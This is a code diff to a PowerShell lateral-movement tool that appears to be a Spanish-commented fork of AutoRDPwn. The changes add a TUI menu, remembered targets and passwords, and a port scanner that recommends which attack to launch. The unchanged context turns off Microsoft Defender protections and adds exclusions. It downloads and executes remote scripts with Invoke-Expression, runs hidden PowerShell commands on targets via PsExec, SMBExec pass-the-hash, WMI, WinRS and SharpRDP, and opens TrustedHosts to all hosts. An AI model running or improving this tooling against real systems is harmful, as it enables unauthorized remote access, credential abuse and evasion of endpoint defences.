@@ -86,8 +86,17 @@ function Read-PlainText {
 
 function Resolve-TargetUser {
     # .\user becomes COMPUTER\user so local target accounts work everywhere; DOMAIN\user and UPN pass through
+    # con IP se busca el nombre real (DNS inverso, luego NetBIOS). Si no hay nombre, se deja .\usuario tal cual:
+    # el formato IP\usuario rompe el logon local (el dominio no puede ser una IP), asi que nunca se usa
     param($user, $computer)
-    if(!$user){ return $null } ; if($user -like '.\*'){ return "$computer\$($user.substring(2))" } ; return $user }
+    if(!$user){ return $null }
+    if($user -like '.\*'){ $hname = $null
+        if($computer -match '^\d+\.\d+\.\d+\.\d+$'){ try { $hname = ([System.Net.Dns]::GetHostEntry($computer).HostName -split '\.')[0] } catch { $hname = $null }
+            if(!$hname){ try { $nb = nbtstat -A $computer 2>$null | Out-String ; if($nb -match '(?m)^\s*([^\s<]+)\s*<00>\s*UNIQUE'){ $hname = $matches[1].trim() } } catch { $hname = $null } } }
+        else { $hname = $computer }
+        if($hname){ return "$hname\$($user.substring(2))" }
+        return $user }
+    return $user }
 
 function Start-RemoteViewer {
     # stored credential via cmdkey: mstsc /shadow with /prompt is what breaks local/domain accounts
@@ -117,6 +126,31 @@ function Test-RemoteTcp {
         $ok = $async.AsyncWaitHandle.WaitOne($TimeoutMs) ; $connected = $client.Connected ; $client.Close()
         if($ok -and $connected){ return $true } ; return $false }
     catch { return $false }}
+
+function Read-TuiMenu {
+    # TUI selector: flechas + Enter (teclas 1-9/M/X tambien valen), Esc = cancelar; devuelve la tecla o $null
+    param([string[]]$Keys, [string[]]$Labels, [int]$Start = 0)
+    $sel = $Start ; $base = [Console]::CursorTop
+    try { while($true){
+        for($i=0; $i -lt $Keys.Count; $i++){ [Console]::SetCursorPosition(2, $base + $i)
+            if($i -eq $sel){ Write-Host "> [$($Keys[$i])] $($Labels[$i])" -ForegroundColor Black -BackgroundColor Green }
+            else { Write-Host "  [$($Keys[$i])] $($Labels[$i])   " -ForegroundColor Gray } }
+        $k = [Console]::ReadKey($true)
+        if($k.Key -eq 'UpArrow'){ $sel = $(if($sel -le 0){ $Keys.Count - 1 } else { $sel - 1 }) }
+        elseif($k.Key -eq 'DownArrow'){ $sel = $(if($sel -ge $Keys.Count - 1){ 0 } else { $sel + 1 }) }
+        elseif($k.Key -eq 'Enter'){ [Console]::SetCursorPosition(0, $base + $Keys.Count) ; return $Keys[$sel] }
+        elseif($k.Key -eq 'Escape'){ [Console]::SetCursorPosition(0, $base + $Keys.Count) ; return $null }
+        else { $c = "$($k.KeyChar)".ToUpper() ; if($Keys -contains $c){ [Console]::SetCursorPosition(0, $base + $Keys.Count) ; return $c } } } }
+    catch { return $Host.UI.ReadLine() }}
+
+function Get-AttackHint {
+    # escanea los puertos clave del objetivo y sugiere el ataque viable para ese estado
+    param($Computer)
+    $p135 = Test-RemoteTcp -Computer $Computer -Port 135 -TimeoutMs 2500 ; $p445 = Test-RemoteTcp -Computer $Computer -Port 445 -TimeoutMs 2500
+    $p3389 = Test-RemoteTcp -Computer $Computer -Port 3389 -TimeoutMs 2500 ; $p5985 = Test-RemoteTcp -Computer $Computer -Port 5985 -TimeoutMs 2500
+    $list = "135=$([int]$p135) 445=$([int]$p445) 3389=$([int]$p3389) 5985=$([int]$p5985)"
+    $sug = if($p5985){ '4/5 (WinRM/WinRS)' } elseif($p445){ '1/2 (SMB)' } elseif($p135){ '3 (WMI/DCOM)' } elseif($p3389){ '7 (SharpRDP, via RDP)' } else { 'ninguno (revisa la red/VPN)' }
+    Write-Host "[i] Puertos del objetivo: $list -- ataque recomendado: $sug" -ForegroundColor DarkGray }
 
 function Remove-Exclusions { 
     $exclusion = Get-MpPreference ; $exclusion.exclusionprocess | % { Remove-MpPreference -ExclusionProcess $_ 2>&1> $null }
@@ -168,23 +202,26 @@ function Remove-Exclusions {
     Add-MpPreference -ExclusionExtension ".exe" 2>&1> $null; Add-MpPreference -ExclusionProcess $pid 2>&1> $null ; Add-MpPreference -ExclusionPath $env:temp 2>&1> $null ; Set-MpPreference -DisableScriptScanning 1 2>&1> $null
     Add-MpPreference -ExclusionExtension ".ps1" 2>&1> $null ; Set-MpPreference -DisableIOAVProtection 1 2>&1> $null ; Set-MpPreference -SubmitSamplesConsent 0 2>&1> $null ; Set-MpPreference -MAPSReporting 0 2>&1> $null
 
-    do { Show-Banner ; Show-Menu
-    $currentuser = [Environment]::username ; if($option -like '-option') { $input=$args[5] } else { Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-    $Random = New-Object System.Random ; "$txt7"-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-    $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine()} ; switch ($input) {
+    $mem_computer = $null ; $mem_user = $null ; $mem_pass = $null ; $reload = 'true' ; do {
+    do { Show-Banner ; if($mem_computer){ Write-Host "[i] Ultimo objetivo: $(if($mem_user){$mem_user}else{'usuario actual'}) @ $mem_computer  (Enter = reutilizar | 0 = volver en los prompts)" -ForegroundColor DarkGray }
+    $currentuser = [Environment]::username ; if($option -like '-option') { $input=$args[5] } else { Write-Host ; & $question ; Write-Host "$txt7" -ForegroundColor Gray
+    $input = Read-TuiMenu -Keys @('1','2','3','4','5','6','7','M','X') -Labels @('PSexec (SMB)','Pass the Hash (SMB)','Windows Management Instrumentation (WMI)','Windows Remote Management (WinRM)','Windows Remote Assistance (WinRS)','Local Session Hijacking (TSCon)','Remote Desktop Execution (RDP)',"$txt1","$txt2") ; $Host.UI.RawUI.ForegroundColor = 'Green' ; if(!$input){ $input = 'X' }} ; switch ($input) {
 
         '1' {
         if($option) { $computer='localhost' } else {
         Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
-        $computer = 'localhost' ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
+        $computer = $Host.UI.ReadLine() ; if($computer -in '0','b','back','volver','atras'){ $input = 'volver' ; break }
+        if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_computer){ $computer = $mem_computer } else { $computer = 'localhost' }
+        & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host $computer } ; $mem_computer = $computer
         Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
-        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser }
+        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_user){ $user = $mem_user }
+        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; if($user){ Write-Host $user } else { Write-Host $currentuser }} ; $mem_user = $user
         $user = Resolve-TargetUser $user $computer
         Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $PlainTextPassword = Read-PlainText ; $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force
-        if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }}
+        do { $PlainTextPassword = Read-PlainText ; if(!$PlainTextPassword -and $mem_pass){ $PlainTextPassword = $mem_pass ; Write-Host "[i] Usando la clave guardada" -ForegroundColor DarkGray }
+        $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force ; if($PlainTextPassword){ $mem_pass = $PlainTextPassword }
+        if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }} until ( $PlainTextPassword ) }
+        if(!(Test-RemoteTcp -Computer $computer -Port 445 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 445 (SMB) esta cerrado en ${computer}.. este ataque no puede funcionar" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
         $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-PSexec.ps1 } else {
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PSexec.ps1')}
         if(!$user) { .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn1" -nobanner -accepteula
@@ -199,16 +236,18 @@ function Remove-Exclusions {
 
         '2' {
         Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
-        $computer = 'localhost' ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
+        $computer = $Host.UI.ReadLine() ; if($computer -in '0','b','back','volver','atras'){ $input = 'volver' ; break }
+        if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_computer){ $computer = $mem_computer } else { $computer = 'localhost' }
+        & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host $computer } ; $mem_computer = $computer
         Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
-        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser ; $user = $currentuser }
+        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_user){ $user = $mem_user }
+        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; if($user){ Write-Host $user } else { $user = $currentuser ; Write-Host $currentuser }} ; $mem_user = $user
         Write-Host ; & $question ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
         $domain = $Host.UI.ReadLine() ; if(!$domain) { [Console]::SetCursorPosition(0,"$cursortop")
         $domain = 'localhost' ; & $question ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
         do { Write-Host ; & $question ; Write-Host "$txt27" -NoNewLine -ForegroundColor Gray ; $hash = $Host.UI.ReadLine()
         if(!$hash) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ( $hash )
+        if(!(Test-RemoteTcp -Computer $computer -Port 445 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 445 (SMB) esta cerrado en ${computer}.. este ataque no puede funcionar" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
         Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-SMBExec.ps1 } else {
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SMBExec.ps1')}
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
@@ -220,16 +259,20 @@ function Remove-Exclusions {
         '3' {
         if($option) { $computer='localhost' } else {
         Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
-        $computer = 'localhost' ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
+        $computer = $Host.UI.ReadLine() ; if($computer -in '0','b','back','volver','atras'){ $input = 'volver' ; break }
+        if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_computer){ $computer = $mem_computer } else { $computer = 'localhost' }
+        & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host $computer } ; $mem_computer = $computer
         Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
-        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser }
+        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_user){ $user = $mem_user }
+        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; if($user){ Write-Host $user } else { Write-Host $currentuser }} ; $mem_user = $user
         $user = Resolve-TargetUser $user $computer
         Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $PlainTextPassword = Read-PlainText ; $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
-        if(!$credential) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }
+        do { $PlainTextPassword = Read-PlainText ; if(!$PlainTextPassword -and $mem_pass){ $PlainTextPassword = $mem_pass ; Write-Host "[i] Usando la clave guardada" -ForegroundColor DarkGray }
+        $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force ; if($PlainTextPassword){ $mem_pass = $PlainTextPassword }
+        if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }} until ( $PlainTextPassword )
+        if($user){ $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) }
         $Host.UI.RawUI.ForegroundColor = 'Blue' }
+        if(!(Test-RemoteTcp -Computer $computer -Port 135 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 135 (DCOM/WMI) esta cerrado en ${computer}.. este ataque no puede funcionar" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
         $CimSes = $null ; if($user -and !$credential){ $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) }
         try { $cimargs = @{ ComputerName = $computer ; SessionOption = (New-CimSessionOption -Protocol Dcom) ; ErrorAction = 'Stop' } ; if($user){ $cimargs['Credential'] = $credential }
         $CimSes = New-CimSession @cimargs } catch { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
@@ -242,17 +285,21 @@ function Remove-Exclusions {
         '4' {
         if($option) { $computer='localhost' } else {
         Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
-        $computer = 'localhost' ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
+        $computer = $Host.UI.ReadLine() ; if($computer -in '0','b','back','volver','atras'){ $input = 'volver' ; break }
+        if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_computer){ $computer = $mem_computer } else { $computer = 'localhost' }
+        & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host $computer } ; $mem_computer = $computer
         Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
-        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser }
+        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_user){ $user = $mem_user }
+        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; if($user){ Write-Host $user } else { Write-Host $currentuser }} ; $mem_user = $user
         $user = Resolve-TargetUser $user $computer
         Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $PlainTextPassword = Read-PlainText ; $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
-        if(!$credential) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }
+        do { $PlainTextPassword = Read-PlainText ; if(!$PlainTextPassword -and $mem_pass){ $PlainTextPassword = $mem_pass ; Write-Host "[i] Usando la clave guardada" -ForegroundColor DarkGray }
+        $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force ; if($PlainTextPassword){ $mem_pass = $PlainTextPassword }
+        if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }} until ( $PlainTextPassword )
+        if($user){ $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) }
         $Host.UI.RawUI.ForegroundColor = 'Blue' }
         if($user -and !$credential){ $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) }
+        if(!(Test-RemoteTcp -Computer $computer -Port 5985 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 5985 (WinRM) esta cerrado en ${computer}.. WinRM no se puede habilitar por si mismo: lanza antes el ataque 3 (WMI) o 1 (SMB)" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
         $sessionoption = New-PSSessionOption -OpenTimeout 8000 -CancelTimeout 3000 -OperationTimeout 30000
         try { if(!$user){ $RDP = New-PSSession -Computer $computer -Authentication Negotiate -SessionOption $sessionoption -ErrorAction Stop }
         else { $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate -SessionOption $sessionoption -ErrorAction Stop } } catch { $RDP = $null }
@@ -263,20 +310,23 @@ function Remove-Exclusions {
 
         '5' {
         Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
-        $computer = 'localhost' ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
+        $computer = $Host.UI.ReadLine() ; if($computer -in '0','b','back','volver','atras'){ $input = 'volver' ; break }
+        if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_computer){ $computer = $mem_computer } else { $computer = 'localhost' }
+        & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host $computer } ; $mem_computer = $computer
         Write-Host "[i] Formato de usuario: DOMINIO\usuario | .\usuario (cuenta local) | usuario@dominio" -ForegroundColor DarkGray
         Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
-        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser ; $user = $currentuser }
+        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_user){ $user = $mem_user }
+        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; if($user){ Write-Host $user } else { $user = $currentuser ; Write-Host $currentuser }} ; $mem_user = $user
         $user = Resolve-TargetUser $user $computer
         do { Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $PlainTextPassword = Read-PlainText ; $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force
+        $PlainTextPassword = Read-PlainText ; if(!$PlainTextPassword -and $mem_pass){ $PlainTextPassword = $mem_pass ; Write-Host "[i] Usando la clave guardada" -ForegroundColor DarkGray }
+        $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force ; if($PlainTextPassword){ $mem_pass = $PlainTextPassword }
         if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }} until ( $PlainTextPassword )
         $Host.UI.RawUI.ForegroundColor = 'Blue'
+        if(!(Test-RemoteTcp -Computer $computer -Port 5985 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 5985 (WinRM) esta cerrado en ${computer}.. WinRS necesita WinRM ya activo en el destino: lanza antes el ataque 3 (WMI) o 1 (SMB)" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
         Write-Host "[i] ${computer}: habilitando WinRM/firewall en el destino (1 sola autenticacion WinRS).." -ForegroundColor DarkGray
-        WinRS /r:$computer /u:$user /p:$PlainTextPassword /noecho /noprofile /allowdelegate "powershell.exe -windowstyle hidden $Pwn1 ; $Pwn2 ; $Pwn3 ; $Pwn4" 2>&1> $null
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" -ForegroundColor Green } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }}
+        $winrsout = & winrs.exe -r:$computer -u:$user -p:$PlainTextPassword -noecho -noprofile -allowdelegate "powershell.exe -windowstyle hidden $Pwn1 ; $Pwn2 ; $Pwn3 ; $Pwn4" 2>&1
+        if($LASTEXITCODE -eq 0){ Write-Host "[+] Command was executed successfully!" -ForegroundColor Green } else { Write-Host "[!] WinRS fallo en ${computer} (codigo $LASTEXITCODE): $winrsout" -ForegroundColor Red ; Write-Host "[i] Si es error de autenticacion, revisa la clave y el formato de usuario (DOMINIO\usuario o .\usuario para cuentas locales)" -ForegroundColor DarkGray ; Start-Sleep -milliseconds 2000 }}
 
         '6' {
         Write-Host ; $test = Test-Command tscon ; if($test -in 'True'){ Write-Host "[i] $txt28" -ForegroundColor Green ; Write-Host
@@ -293,15 +343,18 @@ function Remove-Exclusions {
         '7' {
         if($option) { $computer='localhost' } else {
         Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
-        $computer = 'localhost' ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
+        $computer = $Host.UI.ReadLine() ; if($computer -in '0','b','back','volver','atras'){ $input = 'volver' ; break }
+        if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_computer){ $computer = $mem_computer } else { $computer = 'localhost' }
+        & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host $computer } ; $mem_computer = $computer
         Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
-        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser }
+        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_user){ $user = $mem_user }
+        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; if($user){ Write-Host $user } else { Write-Host $currentuser }} ; $mem_user = $user
         $user = Resolve-TargetUser $user $computer
         Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $PlainTextPassword = Read-PlainText ; $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force
-        if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }}
+        do { $PlainTextPassword = Read-PlainText ; if(!$PlainTextPassword -and $mem_pass){ $PlainTextPassword = $mem_pass ; Write-Host "[i] Usando la clave guardada" -ForegroundColor DarkGray }
+        $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force ; if($PlainTextPassword){ $mem_pass = $PlainTextPassword }
+        if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }} until ( $PlainTextPassword ) }
+        if(!(Test-RemoteTcp -Computer $computer -Port 3389 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 3389 (RDP) esta cerrado en ${computer}.. SharpRDP necesita el escritorio remoto activo" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
         Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-SharpRDP.ps1 } else {
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SharpRDP.ps1')}
         if(!$user) { .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
@@ -314,9 +367,9 @@ function Remove-Exclusions {
         .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn4" }
         del .\SharpRDP.exe 2>&1> $null }
         
-        'M' { Show-Banner ; Show-Modules ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; $module = $Host.UI.ReadLine()
+        'M' { Show-Banner ; if($mem_computer){ Write-Host "[i] Ultimo objetivo: $mem_computer" -ForegroundColor DarkGray }
+        Write-Host ; & $question ; Write-Host "$txt8" -ForegroundColor Gray
+        $module = Read-TuiMenu -Keys @('1','2','3','4','5','6','7','M','X') -Labels @("$txt17","$txt50",'Networking / Pivoting','Remote Desktop Forensics',"$txt64","$txt68","$txt69","$txt22","$txt2") ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; if(!$module){ $module = 'X' }
 
         if($module -like '1') { Show-Banner
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - Named Pipe Remote Shell (SMB)" -ForegroundColor Gray
@@ -599,12 +652,13 @@ function Remove-Exclusions {
    $wsvc = Get-Service WinRM -ErrorAction SilentlyContinue ; if(!$wsvc -or $wsvc.Status -ne 'Running' -or $wsvc.StartType -ne 'Automatic'){ winrm quickconfig -force 2>&1> $null }
    if((Get-Item WSMan:\localhost\Client\Trustedhosts -ErrorAction SilentlyContinue).Value -ne '*'){ Set-Item wsman:\localhost\client\trustedhosts * -Force 2>&1> $null }
    Get-NetConnectionProfile -ErrorAction SilentlyContinue | Where-Object { $_.NetworkCategory -ne 'Private' } | ForEach-Object { Set-NetConnectionProfile -InterfaceIndex $_.InterfaceIndex -NetworkCategory Private -ErrorAction SilentlyContinue }
-   Write-Host "[i] Conectando con $computer" -NoNewLine -ForegroundColor Green ; $sessionoption = New-PSSessionOption -OpenTimeout 8000 -CancelTimeout 3000 -OperationTimeout 60000 ; $connectdeadline = (Get-Date).AddSeconds(45) ; $failopen = 0
+   Write-Host "[i] Conectando con $computer" -NoNewLine -ForegroundColor Green ; $sessionoption = New-PSSessionOption -OpenTimeout 8000 -CancelTimeout 3000 -OperationTimeout 60000 ; $connectdeadline = (Get-Date).AddSeconds(30) ; $failopen = 0 ; $lasterr = $null
    if(!$RDP){ do { Write-Host "." -NoNewLine ; if(Test-RemoteTcp -Computer $computer -Port 5985 -TimeoutMs 1300){
    try { if(!$user){ $RDP = New-PSSession -Computer $computer -Authentication Negotiate -SessionOption $sessionoption -ErrorAction Stop } else { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
-   $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate -SessionOption $sessionoption -ErrorAction Stop } } catch { $RDP = $null ; $failopen++ ; Start-Sleep -Milliseconds 700 } }
+   $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate -SessionOption $sessionoption -ErrorAction Stop } } catch { $RDP = $null ; $lasterr = $_.Exception.Message ; $failopen++ ; Start-Sleep -Milliseconds 700 } }
    else { $failopen = 0 ; Start-Sleep -Milliseconds 1100 }} until ($RDP -or $failopen -ge 3 -or (Get-Date) -gt $connectdeadline) }
-   Write-Host ; if(!$RDP){ Write-Host "[!] WinRM (5985) sin respuesta en $computer.. el modo espejo no funcionara" -ForegroundColor Red } ; $session = $RDP ; if ($session){ $attack = "true"
+   Write-Host ; if(!$RDP){ if($lasterr){ Write-Host "[!] Conexion WinRM fallida en ${computer}: $lasterr" -ForegroundColor Red ; Write-Host "[i] Comprueba la clave y el formato de usuario (DOMINIO\usuario o .\usuario para cuentas locales)" -ForegroundColor DarkGray }
+else { Write-Host "[!] WinRM (5985) sin respuesta en $computer.. el modo espejo no funcionara" -ForegroundColor Red ; Get-AttackHint -Computer $computer } } ; $session = $RDP ; if ($session){ $attack = "true"
 
         do { $seeshadow = "see", "view", "ver", "regarder", "siehe", "vedere", "увидеть", "1" ; $controlshadow = "control", "controlar", "contrôle", "kontrolle", "controllo", "контроль", "2"
